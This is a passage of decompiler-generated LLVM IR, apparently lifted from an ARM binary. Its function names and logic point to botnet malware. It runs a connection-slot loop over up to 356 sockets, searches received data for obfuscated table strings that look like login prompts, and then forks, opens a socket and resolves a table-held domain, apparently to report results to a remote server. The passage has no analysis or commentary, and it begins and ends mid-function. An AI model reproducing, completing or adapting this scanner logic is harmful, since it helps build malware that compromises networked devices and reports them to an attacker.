  %v1_f2e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f2e4 = add i32 %v1_f2e4, -10
  store i32 %v2_f2e4, i32* %r3.global-to-local, align 4
  %v2_f2e8 = load i32, i32* @r4, align 4
  %v3_f2e8 = add i32 %v2_f2e8, 12
  %v4_f2e8 = inttoptr i32 %v3_f2e8 to i32*
  store i32 %v2_f2e4, i32* %v4_f2e8, align 4
  %v1_f2ec = load i32, i32* %r3.global-to-local, align 4
  %v2_f2ec = trunc i32 %v1_f2ec to i8
  %v3_f2ec = load i32, i32* @r4, align 4
  %v4_f2ec = add i32 %v3_f2ec, 384
  %v5_f2ec = inttoptr i32 %v4_f2ec to i8*
  store i8 %v2_f2ec, i8* %v5_f2ec, align 1
  %v0_f2f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f2f0.pr.pr, label %bb410, label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f2d0, %.thread76
  %v0_f2f4 = load i32, i32* @r4, align 4
  store i32 %v0_f2f4, i32* @r0, align 4
  %v0_f2f8 = call i32 @setup_connection()
  br label %bb410

dec_label_pc_f300:                                ; preds = %dec_label_pc_f210
  %v3_f304 = udiv i32 %v3_f300, 32
  %v3_f308 = mul nuw nsw i32 %v3_f304, 4
  store i32 %v2_f30c, i32* @lr, align 4
  %v2_f310 = add i32 %v3_f308, %v2_f30c
  store i32 %v2_f310, i32* %r3.global-to-local, align 4
  %v1_f314 = add i32 %v2_f310, -312
  %v2_f314 = inttoptr i32 %v1_f314 to i32*
  %v3_f314 = load i32, i32* %v2_f314, align 4
  %v1_f318 = urem i32 %v3_f300, 32
  store i32 %v1_f318, i32* %r1.global-to-local, align 4
  %v7_f31c = shl i32 1, %v1_f318
  %v8_f31c = or i32 %v3_f314, %v7_f31c
  store i32 %v8_f31c, i32* %r2.global-to-local, align 4
  %v0_f320 = load i32, i32* @r5, align 4
  %v3_f320 = icmp uge i32 %v0_f320, %v3_f300
  store i1 %v3_f320, i1* %cpsr_c.global-to-local, align 1
  %v9_f320 = icmp eq i32 %v0_f320, %v3_f300
  store i1 %v9_f320, i1* %cpsr_z.global-to-local, align 1
  %v5_f324 = icmp slt i32 %v0_f320, %v3_f300
  br i1 %v5_f324, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_f300
  store i32 %v3_f300, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_f300, %bb417
  store i32 %v8_f31c, i32* %v2_f314, align 4
  br label %bb410

dec_label_pc_f330:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f33c = load i32, i32* @r6, align 4
  %v1_f33c = load i32, i32* @r5, align 4
  %v3_f33c = icmp uge i32 %v0_f33c, %v1_f33c
  store i1 %v3_f33c, i1* %cpsr_c.global-to-local, align 1
  %v9_f33c = icmp eq i32 %v0_f33c, %v1_f33c
  store i1 %v9_f33c, i1* %cpsr_z.global-to-local, align 1
  %v5_f340 = icmp slt i32 %v0_f33c, %v1_f33c
  %storemerge157 = select i1 %v5_f340, i32 %v1_f33c, i32 %v0_f33c
  store i32 %v2_f354, i32* %ip.global-to-local, align 4
  store i32 %v2_f358, i32* %r1.global-to-local, align 4
  store i32 %v2_f35c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f364 = add i32 %storemerge157, 1
  %v5_f370 = call i32 @__libc_select(i32 %v1_f364, i32 %v2_f358, i32 %v2_f35c, i32 0, i32 %v2_f354)
  %v0_f374 = load i32, i32* @r4, align 4
  %v1_f378 = inttoptr i32 %v0_f374 to i32*
  %v2_f378 = call i32 @__GI_time(i32* %v1_f378)
  store i32 ptrtoint (i32* @global_var_21f84.142 to i32), i32* @lr, align 4
  %v0_f380 = load i32, i32* @r4, align 4
  store i32 %v0_f380, i32* %stack_var_-52, align 4
  store i32 %v2_f378, i32* @global_var_21f84.142, align 4
  br label %dec_label_pc_f388

dec_label_pc_f388:                                ; preds = %dec_label_pc_f4fc, %dec_label_pc_f330
  %v1_f394 = phi i32 [ %v1_f500, %dec_label_pc_f4fc ], [ %v0_f380, %dec_label_pc_f330 ]
  store i32 ptrtoint (i32* @global_var_24a68.153 to i32), i32* %r1.global-to-local, align 4
  %v2_f398 = load i32, i32* @global_var_24a68.153, align 4
  store i32 %v2_f398, i32* %r2.global-to-local, align 4
  %v3_f39c = mul i32 %v1_f394, 388
  store i32 %v3_f39c, i32* %r3.global-to-local, align 4
  %v2_f3a0 = add i32 %v2_f398, %v3_f39c
  store i32 %v2_f3a0, i32* @r6, align 4
  %v1_f3a4 = add i32 %v2_f3a0, 4
  %v2_f3a4 = inttoptr i32 %v1_f3a4 to i32*
  %v3_f3a4 = load i32, i32* %v2_f3a4, align 4
  %v2_f3a8 = icmp eq i32 %v3_f3a4, -1
  store i1 %v2_f3a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a8 = icmp eq i32 %v3_f3a4, -1
  store i1 %v7_f3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3a8, label %dec_label_pc_f4fc, label %dec_label_pc_f3b0

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f388
  %v3_f3b0 = udiv i32 %v3_f3a4, 32
  store i32 %v2_f30c, i32* %r3.global-to-local, align 4
  %v3_f3b8 = mul nuw nsw i32 %v3_f3b0, 4
  store i32 %v3_f3b8, i32* @ip, align 4
  %v2_f3bc = add i32 %v3_f3b8, %v2_f30c
  store i32 %v2_f3bc, i32* %r2.global-to-local, align 4
  %v1_f3c0 = add i32 %v2_f3bc, -312
  %v2_f3c0 = inttoptr i32 %v1_f3c0 to i32*
  %v3_f3c0 = load i32, i32* %v2_f3c0, align 4
  %v1_f3c4 = urem i32 %v3_f3a4, 32
  store i32 %v1_f3c4, i32* %r1.global-to-local, align 4
  %v2_f3c8 = add nsw i32 %v1_f3c4, -1
  %v3_f3c8 = shl i32 1, %v2_f3c8
  %v4_f3c8 = and i32 %v3_f3c0, %v3_f3c8
  %v5_f3c8 = icmp ne i32 %v4_f3c8, 0
  store i1 %v5_f3c8, i1* %cpsr_c.global-to-local, align 1
  %v6_f3c8 = ashr i32 %v3_f3c0, %v1_f3c4
  store i32 %v6_f3c8, i32* %r3.global-to-local, align 4
  %v1_f3cc = urem i32 %v6_f3c8, 2
  %v2_f3cc = icmp eq i32 %v1_f3cc, 0
  store i1 %v2_f3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3cc, label %dec_label_pc_f3d4, label %dec_label_pc_ff2c

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3b0, %dec_label_pc_ffd0
  %v1_f3e0 = phi i32 [ %v1_f3c4, %dec_label_pc_f3b0 ], [ %v1_f3e0.pre, %dec_label_pc_ffd0 ]
  %v0_f3d8 = phi i32 [ %v3_f3b8, %dec_label_pc_f3b0 ], [ %v0_f3d8.pre, %dec_label_pc_ffd0 ]
  store i32 %v2_f30c, i32* @lr, align 4
  %v2_f3d8 = add i32 %v0_f3d8, %v2_f30c
  store i32 %v2_f3d8, i32* %r2.global-to-local, align 4
  %v1_f3dc = add i32 %v2_f3d8, -184
  %v2_f3dc = inttoptr i32 %v1_f3dc to i32*
  %v3_f3dc = load i32, i32* %v2_f3dc, align 4
  %v2_f3e0 = add i32 %v1_f3e0, -1
  %v3_f3e0 = shl i32 1, %v2_f3e0
  %v4_f3e0 = and i32 %v3_f3dc, %v3_f3e0
  %v5_f3e0 = icmp ne i32 %v4_f3e0, 0
  store i1 %v5_f3e0, i1* %cpsr_c.global-to-local, align 1
  %v6_f3e0 = ashr i32 %v3_f3dc, %v1_f3e0
  store i32 %v6_f3e0, i32* %r3.global-to-local, align 4
  %v1_f3e4 = urem i32 %v6_f3e0, 2
  %v2_f3e4 = icmp eq i32 %v1_f3e4, 0
  store i1 %v2_f3e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3e4, label %dec_label_pc_f4fc, label %dec_label_pc_f3ec.preheader

dec_label_pc_f3ec.preheader:                      ; preds = %dec_label_pc_f3d4
  %v0_f3ec182 = load i32, i32* @r6, align 4
  %v1_f3ec183 = add i32 %v0_f3ec182, 12
  %v2_f3ec184 = inttoptr i32 %v1_f3ec183 to i32*
  %v3_f3ec185 = load i32, i32* %v2_f3ec184, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3f0181187 = icmp eq i32 %v3_f3ec185, 0
  store i1 %v2_f3f0181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3f0181187, label %dec_label_pc_f4fc, label %dec_label_pc_f3f8.lr.ph

dec_label_pc_f3ec.loopexit:                       ; preds = %dec_label_pc_f54c, %dec_label_pc_f638
  %v0_f3ec = load i32, i32* @r6, align 4
  %v1_f3ec = add i32 %v0_f3ec, 12
  %v2_f3ec = inttoptr i32 %v1_f3ec to i32*
  %v3_f3ec = load i32, i32* %v2_f3ec, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3f0181 = icmp eq i32 %v3_f3ec, 0
  store i1 %v2_f3f0181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3f0181, label %dec_label_pc_f4fc, label %dec_label_pc_f3f8.lr.ph

dec_label_pc_f3f8.lr.ph:                          ; preds = %dec_label_pc_f3ec.preheader, %dec_label_pc_f3ec.loopexit
  %v0_f3f8231 = phi i32 [ %v0_f3ec, %dec_label_pc_f3ec.loopexit ], [ %v0_f3ec182, %dec_label_pc_f3ec.preheader ]
  br label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3f0.backedge.thread, %dec_label_pc_f3f0.backedge, %dec_label_pc_f3f0.backedge.thread564, %dec_label_pc_f3f8.lr.ph
  %v0_fef8 = phi i32 [ %v0_f3f8231, %dec_label_pc_f3f8.lr.ph ], [ %v0_f3f8228, %dec_label_pc_f3f0.backedge ], [ %v0_f470, %dec_label_pc_f3f0.backedge.thread ], [ %v0_f470, %dec_label_pc_f3f0.backedge.thread564 ]
  %v1_f3f8 = add i32 %v0_fef8, 24
  %v2_f3f8 = inttoptr i32 %v1_f3f8 to i32*
  %v3_f3f8 = load i32, i32* %v2_f3f8, align 4
  store i32 %v3_f3f8, i32* @r3, align 4
  %v2_f3fc = icmp ugt i32 %v3_f3f8, 355
  store i1 %v2_f3fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3fc = icmp eq i32 %v3_f3f8, 356
  store i1 %v7_f3fc, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_fef8, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f3fc, label %dec_label_pc_fef8, label %dec_label_pc_f408

dec_label_pc_f408:                                ; preds = %dec_label_pc_f3f8, %dec_label_pc_fef8
  store i32 %v0_f00c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f028, align 4
  %v0_f414 = load i32, i32* @r6, align 4
  %v1_f414 = add i32 %v0_f414, 24
  %v2_f414 = inttoptr i32 %v1_f414 to i32*
  %v3_f414 = load i32, i32* %v2_f414, align 4
  store i32 %v3_f414, i32* %r2.global-to-local, align 4
  %v0_f418 = load i32, i32* @fp, align 4
  %v2_f418 = add i32 %v0_f418, %v3_f414
  store i32 %v2_f418, i32* @r4, align 4
  %v1_f41c = add i32 %v0_f414, 4
  %v2_f41c = inttoptr i32 %v1_f41c to i32*
  %v3_f41c = load i32, i32* %v2_f41c, align 4
  %v1_f420 = sub i32 356, %v3_f414
  store i32 %v1_f420, i32* %r2.global-to-local, align 4
  store i32 %v2_f418, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f42c = call i32 @__libc_recv(i32 %v3_f41c, i32 %v2_f418, i32 %v1_f420, i32 16384)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f430 = icmp eq i32 %v4_f42c, 0
  store i1 %v2_f430, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_f42c, 1
  br i1 %tmp419, label %dec_label_pc_f4a8, label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %dec_label_pc_f408
  %v0_f438 = load i32, i32* @r5, align 4
  store i32 %v0_f438, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %.thread83, %dec_label_pc_f438
  %v3_f448 = phi i32 [ %v1_f44c, %.thread83 ], [ %v0_f438, %dec_label_pc_f438 ]
  %v1_f43c = load i32, i32* @r4, align 4
  %v2_f43c = add i32 %v1_f43c, %v3_f448
  %v3_f43c = inttoptr i32 %v2_f43c to i8*
  %v4_f43c = load i8, i8* %v3_f43c, align 1
  %v6_f43c = zext i8 %v4_f43c to i32
  store i32 %v6_f43c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f440 = icmp eq i8 %v4_f43c, 0
  store i1 %v2_f440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f440, label %bb420, label %.thread83

bb420:                                            ; preds = %dec_label_pc_f43c
  %v2_f444 = add nuw nsw i32 %v6_f43c, 65
  store i32 %v2_f444, i32* %r3.global-to-local, align 4
  %v2_f448 = trunc i32 %v2_f444 to i8
  store i8 %v2_f448, i8* %v3_f43c, align 1
  %v0_f44c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread83

.thread83:                                        ; preds = %dec_label_pc_f43c, %bb420
  %v0_f44c = phi i32 [ %v3_f448, %dec_label_pc_f43c ], [ %v0_f44c.pre, %bb420 ]
  %v1_f44c = add i32 %v0_f44c, 1
  store i32 %v1_f44c, i32* %r2.global-to-local, align 4
  %v3_f450 = icmp uge i32 %v1_f44c, %v4_f42c
  store i1 %v3_f450, i1* %cpsr_c.global-to-local, align 1
  %v9_f450 = icmp eq i32 %v1_f44c, %v4_f42c
  store i1 %v9_f450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f450, label %dec_label_pc_f458, label %dec_label_pc_f43c

dec_label_pc_f458:                                ; preds = %.thread83, %dec_label_pc_f4ac
  store i32 ptrtoint (i32* @global_var_21f84.142 to i32), i32* @lr, align 4
  %v0_f45c = load i32, i32* @r6, align 4
  %v1_f45c = add i32 %v0_f45c, 24
  %v2_f45c = inttoptr i32 %v1_f45c to i32*
  %v3_f45c = load i32, i32* %v2_f45c, align 4
  %v2_f460 = load i32, i32* @global_var_21f84.142, align 4
  store i32 %v2_f460, i32* %r2.global-to-local, align 4
  %v2_f464 = add i32 %v3_f45c, %v4_f42c
  store i32 %v2_f464, i32* %r3.global-to-local, align 4
  store i32 %v2_f464, i32* %v2_f45c, align 4
  %v0_f46c = load i32, i32* %r2.global-to-local, align 4
  %v1_f46c = load i32, i32* @r6, align 4
  %v2_f46c = add i32 %v1_f46c, 8
  %v3_f46c = inttoptr i32 %v2_f46c to i32*
  store i32 %v0_f46c, i32* %v3_f46c, align 4
  br label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f640, %dec_label_pc_f458
  %v0_f470 = load i32, i32* @r6, align 4
  %v1_f470 = add i32 %v0_f470, 12
  %v2_f470 = inttoptr i32 %v1_f470 to i32*
  %v3_f470 = load i32, i32* %v2_f470, align 4
  %v1_f474 = add i32 %v3_f470, -2
  store i32 %v1_f474, i32* @r3, align 4
  %v7_f478 = icmp eq i32 %v1_f474, 8
  store i1 %v7_f478, i1* %cpsr_z.global-to-local, align 1
  %v5_f47c = and i32 %v1_f474, 1073741824
  %v6_f47c = icmp ne i32 %v5_f47c, 0
  store i1 %v6_f47c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f470, label %dec_label_pc_f3f0.backedge [
    i32 2, label %dec_label_pc_f73c
    i32 3, label %dec_label_pc_fca0
    i32 4, label %dec_label_pc_fae0
    i32 5, label %dec_label_pc_f8e0
    i32 6, label %dec_label_pc_f80c
    i32 7, label %dec_label_pc_fbcc
    i32 8, label %dec_label_pc_f9b4
    i32 9, label %dec_label_pc_f668
    i32 10, label %dec_label_pc_f514
  ]

dec_label_pc_f4a8:                                ; preds = %dec_label_pc_f408
  br i1 %v2_f430, label %dec_label_pc_1015c, label %dec_label_pc_f4ac

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f4a8
  %v3_f4ac = icmp eq i32 %v4_f42c, -1
  store i1 %v3_f4ac, i1* %cpsr_c.global-to-local, align 1
  %v8_f4ac = icmp eq i32 %v4_f42c, -1
  store i1 %v8_f4ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f4ac, label %dec_label_pc_f4b4, label %dec_label_pc_f458

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f4ac
  store i32 %v0_f00c, i32* %ip.global-to-local, align 4
  %v2_f4b8 = load i32, i32* %v2_f028, align 4
  store i32 %v2_f4b8, i32* %r3.global-to-local, align 4
  %v2_f4bc = icmp ugt i32 %v2_f4b8, 10
  store i1 %v2_f4bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4bc = icmp eq i32 %v2_f4b8, 11
  store i1 %v7_f4bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4bc, label %dec_label_pc_f4fc, label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f4b4, %dec_label_pc_1015c
  %v0_f4c4 = load i32, i32* @r6, align 4
  %v1_f4c4 = add i32 %v0_f4c4, 4
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  %v1_f4c8 = call i32 @__GI___libc_close(i32 %v3_f4c4)
  %v0_f4cc = load i32, i32* @r6, align 4
  %v1_f4cc = add i32 %v0_f4cc, 384
  %v2_f4cc = inttoptr i32 %v1_f4cc to i8*
  %v3_f4cc = load i8, i8* %v2_f4cc, align 1
  %v4_f4cc = zext i8 %v3_f4cc to i32
  %v1_f4d0 = add nuw nsw i32 %v4_f4cc, 1
  %v1_f4d4 = urem i32 %v1_f4d0, 256
  store i32 %v1_f4d4, i32* %r3.global-to-local, align 4
  %v2_f4d8 = icmp ugt i32 %v1_f4d4, 8
  store i1 %v2_f4d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d8 = icmp eq i32 %v1_f4d4, 9
  store i1 %v7_f4d8, i1* %cpsr_z.global-to-local, align 1
  %v1_f4dc = trunc i32 %v1_f4d0 to i8
  store i8 %v1_f4dc, i8* %v2_f4cc, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f4e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f4e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f4e4 = xor i1 %v1_f4e4, true
  %v3_f4e4 = and i1 %v0_f4e4, %v2_f4e4
  br i1 %v3_f4e4, label %bb421, label %.thread312

.thread312:                                       ; preds = %dec_label_pc_f4c4
  %v1_f4e8308313 = load i32, i32* @r6, align 4
  %v2_f4e8309314 = add i32 %v1_f4e8308313, 4
  %v3_f4e8310315 = inttoptr i32 %v2_f4e8309314 to i32*
  store i32 -1, i32* %v3_f4e8310315, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f4c4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f4e8304 = load i32, i32* @r6, align 4
  %v2_f4e8305 = add i32 %v1_f4e8304, 4
  %v3_f4e8306 = inttoptr i32 %v2_f4e8305 to i32*
  store i32 -1, i32* %v3_f4e8306, align 4
  %v4_f4ec = load i32, i32* %r3.global-to-local, align 4
  %v5_f4ec = load i32, i32* @r6, align 4
  %v6_f4ec = add i32 %v5_f4ec, 12
  %v7_f4ec = inttoptr i32 %v6_f4ec to i32*
  store i32 %v4_f4ec, i32* %v7_f4ec, align 4
  %v4_f4f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_f4f0 = trunc i32 %v4_f4f0 to i8
  %v6_f4f0 = load i32, i32* @r6, align 4
  %v7_f4f0 = add i32 %v6_f4f0, 384
  %v8_f4f0 = inttoptr i32 %v7_f4f0 to i8*
  store i8 %v5_f4f0, i8* %v8_f4f0, align 1
  %v0_f4f4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f4f4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread312, %bb421
  %v1_f4f8 = phi i1 [ %v1_f4f4.pre, %bb421 ], [ %v0_f4e4, %.thread312 ]
  %v0_f4f8 = phi i1 [ %v0_f4f4.pre, %bb421 ], [ %v1_f4e4, %.thread312 ]
  %v2_f4f4 = xor i1 %v1_f4f8, true
  %v3_f4f4 = or i1 %v0_f4f8, %v2_f4f4
  br i1 %v3_f4f4, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 62716, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f4f4, i32 ptrtoint (i32* @global_var_e858.191 to i32))
  br label %dec_label_pc_f4fc

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f3ec.loopexit, %dec_label_pc_f3f0.backedge, %dec_label_pc_f3ec.preheader, %dec_label_pc_f4b4, %dec_label_pc_f3d4, %dec_label_pc_f388, %dec_label_pc_fff0, %bb424
  %v3_f4fc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f4fc, i32* %r3.global-to-local, align 4
  %v1_f500 = add i32 %v3_f4fc, 1
  store i32 %v1_f500, i32* @r4, align 4
  %v3_f504 = icmp ugt i32 %v1_f500, 355
  store i1 %v3_f504, i1* %cpsr_c.global-to-local, align 1
  %v8_f504 = icmp eq i32 %v1_f500, 356
  store i1 %v8_f504, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f500, i32* %stack_var_-52, align 4
  %v5_f50c = icmp slt i32 %v1_f500, 356
  br i1 %v5_f50c, label %dec_label_pc_f388, label %dec_label_pc_ecf8

dec_label_pc_f514:                                ; preds = %dec_label_pc_f470
  %v1_f518 = call i32 @table_unlock_val(i32 12)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_f528 = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f52c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f528, i32* %r2.global-to-local, align 4
  %v1_f534 = add i32 %v3_f52c, -1
  store i32 %v1_f534, i32* %r3.global-to-local, align 4
  %v0_f538 = load i32, i32* @fp, align 4
  %v0_f53c = load i32, i32* @r6, align 4
  %v1_f53c = add i32 %v0_f53c, 24
  %v2_f53c = inttoptr i32 %v1_f53c to i32*
  %v3_f53c = load i32, i32* %v2_f53c, align 4
  store i32 %v3_f53c, i32* %r1.global-to-local, align 4
  %v4_f540 = call i32 @util_memsearch(i32 %v0_f538, i32 %v3_f53c, i32 %v3_f528, i32 %v1_f534)
  %v3_f544 = icmp eq i32 %v4_f540, -1
  store i1 %v3_f544, i1* %cpsr_c.global-to-local, align 1
  %v8_f544 = icmp eq i32 %v4_f540, -1
  store i1 %v8_f544, i1* %cpsr_z.global-to-local, align 1
  %v1_f550 = call i32 @table_lock_val(i32 12)
  br i1 %v3_f544, label %dec_label_pc_f54c, label %dec_label_pc_fe90

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f514
  %v1_f558 = call i32 @table_unlock_val(i32 11)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_f568 = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  %v3_f56c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f568, i32* %r2.global-to-local, align 4
  %v1_f574 = add i32 %v3_f56c, -1
  store i32 %v1_f574, i32* %r3.global-to-local, align 4
  %v0_f578 = load i32, i32* @r6, align 4
  %v1_f578 = add i32 %v0_f578, 24
  %v2_f578 = inttoptr i32 %v1_f578 to i32*
  %v3_f578 = load i32, i32* %v2_f578, align 4
  store i32 %v3_f578, i32* %r1.global-to-local, align 4
  %v0_f57c = load i32, i32* @fp, align 4
  %v4_f580 = call i32 @util_memsearch(i32 %v0_f57c, i32 %v3_f578, i32 %v3_f568, i32 %v1_f574)
  store i32 %v4_f580, i32* @r7, align 4
  %v1_f58c = call i32 @table_lock_val(i32 11)
  %v0_f590 = load i32, i32* @r7, align 4
  %v2_f590 = icmp eq i32 %v0_f590, -1
  store i1 %v2_f590, i1* %cpsr_c.global-to-local, align 1
  %v7_f590 = icmp eq i32 %v0_f590, -1
  store i1 %v7_f590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f590, label %dec_label_pc_f3ec.loopexit, label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f54c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f598 = icmp eq i32 %v0_f590, 0
  store i1 %v2_f598, i1* %cpsr_z.global-to-local, align 1
  %tmp425 = icmp slt i32 %v0_f590, 1
  br i1 %tmp425, label %dec_label_pc_f638, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f598
  %v0_f5a0 = load i32, i32* @r6, align 4
  %v1_f5a0 = add i32 %v0_f5a0, 20
  %v2_f5a0 = inttoptr i32 %v1_f5a0 to i16*
  %v3_f5a0 = load i16, i16* %v2_f5a0, align 2
  %v4_f5a0 = zext i16 %v3_f5a0 to i32
  store i32 %v4_f5a0, i32* %r3.global-to-local, align 4
  %v1_f5a4 = add i32 %v0_f5a0, 16
  %v2_f5a4 = inttoptr i32 %v1_f5a4 to i32*
  %v3_f5a4 = load i32, i32* %v2_f5a4, align 4
  store i32 %v3_f5a4, i32* %r2.global-to-local, align 4
  store i32 %v2_f5a8, i32* %r1.global-to-local, align 4
  store i32 %v4_f5a0, i32* %stack_var_-42, align 4
  store i32 %v3_f5a4, i32* %stack_var_-60, align 4
  %v1_f5b4 = inttoptr i32 %v0_f5a0 to i32*
  %v2_f5b4 = load i32, i32* %v1_f5b4, align 4
  store i32 %v2_f5b4, i32* @sb, align 4
  %v0_f5b8 = call i32 @__libc_fork()
  %v7_f5bc = icmp eq i32 %v0_f5b8, -1
  %.464 = zext i1 %v7_f5bc to i32
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5c8 = icmp eq i32 %v0_f5b8, 0
  store i1 %v2_f5c8, i1* %cpsr_z.global-to-local, align 1
  %tmp428 = icmp slt i32 %v0_f5b8, 1
  br i1 %tmp428, label %bb429, label %.thread86

.thread86:                                        ; preds = %dec_label_pc_f5a0
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f620

bb429:                                            ; preds = %dec_label_pc_f5a0
  store i32 %.464, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5d4 = icmp eq i1 %v7_f5bc, false
  store i1 %v2_f5d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5d4, label %dec_label_pc_f5dc, label %dec_label_pc_f620

dec_label_pc_f5dc:                                ; preds = %bb429
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f5e8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_f5ec = icmp eq i32 %v3_f5e8, -1
  store i1 %v2_f5ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f5ec = icmp eq i32 %v3_f5e8, -1
  store i1 %v7_f5ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f5e8, i32* @r8, align 4
  br i1 %v7_f5ec, label %dec_label_pc_1012c, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5dc
  %v1_f5fc = call i32 @table_unlock_val(i32 3)
  %v1_f604 = call i32 @table_unlock_val(i32 4)
  %v0_f608 = load i32, i32* @sl, align 4
  store i32 %v0_f608, i32* %r1.global-to-local, align 4
  %v2_f610 = inttoptr i32 %v0_f608 to i32*
  %v3_f610 = call i32 @table_retrieve_val(i32 3, i32* %v2_f610)
  %v1_f614 = call i32 @resolv_lookup(i32 %v3_f610)
  store i32 %v1_f614, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f618 = icmp eq i32 %v1_f614, 0
  store i1 %v3_f618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f618, label %dec_label_pc_f620, label %dec_label_pc_1000c

dec_label_pc_f620:                                ; preds = %.thread86, %dec_label_pc_f5f8, %bb429
  %v0_f620 = load i32, i32* @r6, align 4
  %v1_f620 = add i32 %v0_f620, 4
  %v2_f620 = inttoptr i32 %v1_f620 to i32*
  %v3_f620 = load i32, i32* %v2_f620, align 4
  %v1_f624 = call i32 @__GI___libc_close(i32 %v3_f620)
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f630 = load i32, i32* @r6, align 4
  %v2_f630 = add i32 %v1_f630, 4
  %v3_f630 = inttoptr i32 %v2_f630 to i32*
  store i32 -1, i32* %v3_f630, align 4
  %v0_f634 = load i32, i32* %r2.global-to-local, align 4
  %v1_f634 = load i32, i32* @r6, align 4
  %v2_f634 = add i32 %v1_f634, 12
  %v3_f634 = inttoptr i32 %v2_f634 to i32*
  store i32 %v0_f634, i32* %v3_f634, align 4
  br label %dec_label_pc_f638

dec_label_pc_f638:                                ; preds = %dec_label_pc_f7fc, %bb438, %dec_label_pc_fda4, %dec_label_pc_f598, %dec_label_pc_fe48, %dec_label_pc_fb94, %dec_label_pc_f620
  %v0_f638 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
